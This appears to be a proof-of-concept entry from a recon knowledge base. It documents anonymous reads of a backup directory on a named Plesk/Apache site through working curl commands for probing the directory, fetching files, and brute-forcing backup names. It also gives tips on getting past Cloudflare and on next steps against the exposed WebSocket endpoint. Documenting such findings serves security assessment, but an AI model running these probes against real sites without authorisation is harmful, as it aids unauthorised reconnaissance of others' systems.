# copperline 部署备份目录 /bbs-copperline/Backup/new/ 匿名可读：历史 bundle + 交付文档 + 配置示例（目录禁列但文件全开）

- **code**: copperline-bbs-backup-dir-unauth-deploy-bundle-read
- **kind**: poc
- **category**: info-leak
- **component**: Plesk + Apache 静态站点（copperline WebAssembly 交付包 /bbs-&lt;product&gt;/Backup/）
- **versions**: web bundle 2026-07-20 "fourth drop"；主目录 README v0.18.0 (2d12257f)
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Linux curl 8.5.0 直连 copperline.retro32.com（Cloudflare 前置、Plesk 源站）实测，finding#114 finding_checks.verdict=verified：① OPTIONS /bbs-copperline/Backup/ → HTTP/2 200，content-type: httpd/unix-directory，allow: POST,OPTIONS,HEAD,GET；同路径无斜杠 → 301（目录存在）；带斜杠 GET → 403，body 1909B 为 Plesk "Forbidden"（仅禁列）。② GET /bbs-copperline/Backup/new/README.md → 200 text/markdown 4741B，首行 "# Copperline web bundle for Retro32 (2026-07-20, fourth drop)"。③ /new/pkg/copperline_web_bg.wasm → 200 2216856B；/new/copperline.json.example → 200 145B，含 "serial_url":"wss://bbs.&lt;domain&gt;:8443/"。④ GET /bbs-copperline/README.md → 200 text/markdown 5058B（v0.18.0 2d12257f）。⑤ 阴性对照：/bbs-copperline/Backup/zzq-nonexistent-9f3a → 404，content-length 1922，排除泛化 200。泄露内容仅为版本/构建日期/文件清单/前端 bundle 与 WS 端点，未含凭据或服务端源码。
- **path**: pocs/copperline-bbs-backup-dir-unauth-deploy-bundle-read/poc.http
- **tags**: info-leak,backup-directory,directory-listing-disabled,plesk,apache,unix-directory,wasm,websocket-endpoint,version-disclosure,deployment-bundle
- **created_at**: 2026-11-11T17:07:56.645Z
- **engine**: https://copperline.retro32.com
- **found_by**: recon

## 描述

静态站点把部署备份/交付目录留在 web 根下：目录本身禁止列举（Plesk/Apache 403），但只要文件名已知即可匿名直读历史 bundle、构建说明、wasm 主体与配置示例，泄露版本号、构建日期、文件清单和 WebSocket 桥接端点。前提：目标为 Plesk/Apache 静态托管、备份目录名可从 robots/页面/命名规律猜到；无任何凭据要求。

## 用法

```
【判据速查】403 + Plesk "Forbidden"（约 1.9KB）只代表目录禁列，不代表文件不可读——必须继续按文件名探测；OPTIONS 返回 content-type: httpd/unix-directory 可服务端确认该路径是真实目录（这是比 301 更硬的证据）。

变量：HOST=copperline.&lt;domain&gt;；PROD=bbs-copperline（备份目录前缀 /&lt;PROD&gt;/Backup/）。

# 1) 目录存在性 + 是否禁列（三条互补）
curl -skI "https://$HOST/$PROD/Backup"          # 期望 301 → 目录存在
curl -sk  -D- -o /dev/null "https://$HOST/$PROD/Backup/"   # 期望 403 + Plesk Forbidden（禁列）
curl -sk  -X OPTIONS -D- -o /dev/null "https://$HOST/$PROD/Backup/"
# 期望 200 + allow: POST,OPTIONS,HEAD,GET + content-type: httpd/unix-directory

# 2) 直读已知交付文档（备份子目录名常见：new / latest / old / YYYY-MM-DD）
curl -sk "https://$HOST/$PROD/Backup/new/README.md" | head -5
# 命中特征：200 + text/markdown，首行含产品名与构建日期，正文有文件清单/版本/构建命令

# 3) 按 README 清单逐个取（大小是第二重判据）
curl -sk -o try.js            -w '%{http_code} %{size_download}\n' "https://$HOST/$PROD/Backup/new/try.js"
curl -sk -o app.wasm          -w '%{http_code} %{size_download}\n' "https://$HOST/$PROD/Backup/new/pkg/copperline_web_bg.wasm"
curl -sk -o pkg.js            -w '%{http_code} %{size_download}\n' "https://$HOST/$PROD/Backup/new/pkg/copperline_web.js"
curl -sk -o cfg.example.json  -w '%{http_code} %{size_download}\n' "https://$HOST/$PROD/Backup/new/copperline.json.example"
# 配置示例常泄露后端端点，如 {"serial_url":"wss://bbs.&lt;domain&gt;:8443/","df0":"adf/...adf"}

# 4) 上一级目录通常还有一份发布说明
curl -sk "https://$HOST/$PROD/README.md" | head -20   # 版本号/commit/发布日期

# 5) 阴性对照（必做，排除泛化 200）
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://$HOST/$PROD/Backup/zzq-nonexistent-9f3a"
# 期望 404 + 固定长度（本例 1922B Plesk 404）

【判据】
- OPTIONS 200 + httpd/unix-directory = 服务端承认目录；GET 403 只是禁止列举（index 关闭），不是访问控制。
- 文件 200 + content-type 与扩展名一致 + size 与 README 声明的字节数吻合 = 真读到内容（不是 SPA 回退壳）。
- 404 与 403 可差分 = 排除"全站返回 200 壳页"的假阳性。

【失败/踩坑】
- 停在 403 就收工是最常见误判；403 后必须继续猜文件名（README.md、index.html、*.json.example、pkg/*）。
- 大小写敏感：/Backup/New/、/Backup/2026-07-20/ 可能 404，实际是 /Backup/new/。
- 目录名不可列举时用 README/robots/前端注释/发布记录反推，或对 new|latest|old|backup|dist|build|YYYY-MM-DD 小字典爆破。
- 路径穿越（/Backup/%2e%2e/）在本类 Plesk 前置上常返回 200 重定向壳页，不能当成"穿越成功"，需看最终落地内容。
- Cloudflare 前置时默认 UA 可能被加严，带浏览器 UA 并控制速率；带 -I 时部分站对 HEAD 处理不同，用 GET -D- 复核。
- 泄露内容若只有前端 bundle/文档/示例配置，影响限于版本与端点泄露（low）；不要把它升级描述成源码或凭据泄露。

【延伸】拿到 wss:// 端点后可评估 WebSocket 桥接服务的鉴权与协议（另开条目），wasm/js 可做前端逆向还原接口与常量。
```

## 正文

```
# copperline 部署备份目录匿名可读（Plesk/Apache 静态站点）

## 前置条件
- 目标静态站点由 Plesk + Apache 托管，web 根下残留部署备份目录（本例 `/bbs-<product>/Backup/`）。
- 目录关闭了 index 列举（403），但未对具体文件做访问控制。
- 无需任何凭据/Cookie；HTTPS 直连即可（Cloudflare 前置时用浏览器 UA，单线程低速率）。

## 复现步骤

### 1. 证明目录存在且只是"禁列"
```bash
HOST=copperline.<domain>
PROD=bbs-copperline

# 无斜杠 → 301，证明目录存在
curl -skI "https://$HOST/$PROD/Backup"

# 带斜杠 → 403，Plesk "Forbidden"（约 1909B），只是禁止目录列举
curl -sk -D- -o /dev/null "https://$HOST/$PROD/Backup/"

# OPTIONS → 200，content-type: httpd/unix-directory，allow: POST,OPTIONS,HEAD,GET
# 这是服务端对"它是目录"的硬确认
curl -sk -X OPTIONS -D- -o /dev/null "https://$HOST/$PROD/Backup/"
```

实测响应（2026-11-11）：
```
HTTP/2 403
content-type: text/html; charset=utf-8
content-length: 1909     # Plesk Forbidden 页

HTTP/2 200
allow: POST,OPTIONS,HEAD,GET
content-type: httpd/unix-directory
```

### 2. 直读备份子目录里的交付文档
```bash
curl -sk -D- "https://$HOST/$PROD/Backup/new/README.md" | head -20
```
实测：`HTTP/2 200`，`content-type: text/markdown`，`content-length: 4741`，
正文首行：
```
# Copperline web bundle for Retro32 (2026-07-20, fourth drop)
```
README 内含构建时间、版本、文件清单与构建/部署说明。

### 3. 按 README 清单取文件（size 与 content-type 双重校验）
```bash
for f in \
  new/README.md \
  new/try.js \
  new/pkg/copperline_web.js \
  new/pkg/copperline_web_bg.wasm \
  new/aros/LICENSE \
  new/adf/retro32-term.adf \
  new/copperline.json.example \
  README.md ; do
  code=$(curl -sk -o "/tmp/$(basename "$f")" -w '%{http_code} %{size_download} %{content_type}' \
        "https://$HOST/$PROD/Backup/$f")
  echo "$f -> $code"
done
```
实测结果：
| 路径 | 状态 | 大小 |
|---|---|---|
| `/Backup/new/README.md` | 200 text/markdown | 4741 |
| `/Backup/new/try.js` | 200 | 90628 |
| `/Backup/new/pkg/copperline_web.js` | 200 | 28978 |
| `/Backup/new/pkg/copperline_web_bg.wasm` | 200 | 2216856 |
| `/Backup/new/aros/LICENSE` | 200 | 24679 |
| `/Backup/new/adf/retro32-term.adf` | 200 | 901120 |
| `/Backup/new/copperline.json.example` | 200 | 145 |
| `/Backup/README.md` | 200 text/markdown | 5058 |

配置示例内容（泄露后端桥接端点）：
```json
{"df0":"adf/retro32-term.adf","joy":"off","floppy_sounds":false,
 "serial_url":"wss://bbs.<domain>:8443/","autoboot":true}
```
上一级 `README.md` 泄露发布版本：v0.18.0（commit 2d12257f）。

### 4. 阴性对照（必做）
```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' \
  "https://$HOST/$PROD/Backup/zzq-nonexistent-9f3a"
# 实测：404 1922   （Plesk 404 固定长度）
```
403（禁列）与 404（不存在）可差分，且 200 文件的大小与 README 声明一致，
排除"全站 SPA 壳页一律 200"的假阳性。

### 5. 已排除的路径（避免重复投入）
- `/Backup/New/`、`/Backup/2026-07-20/` → 404（大小写/日期命名无效）。
- `/Backup/*.zip`（110+ 常见备份文件名）→ 全部 404，无压缩包直下。
- `/Backup/%2e%2e/` 等穿越 → 返回 200 重定向壳页，非真实穿越，不要误报。

## 影响与定性
- 泄露：产品版本、构建日期、完整文件清单、前端 wasm/js、示例配置与 WebSocket 端点
  `wss://bbs.<domain>:8443/`。
- 未见：服务端源码、凭据、数据库配置、私钥。故定级 low（信息泄露），
  价值在于为后续 WebSocket 桥接服务与前端逆向提供入口与版本基线。

## 通用化
任何 Plesk/Apache 静态站点都适用此判据：
`301(无斜杠) + 403(禁列) + OPTIONS: httpd/unix-directory` 三者同现即备份目录存在，
随后按 `new|latest|old|dist|build|YYYY-MM-DD` 小字典 + README 反推文件名逐个取。
```
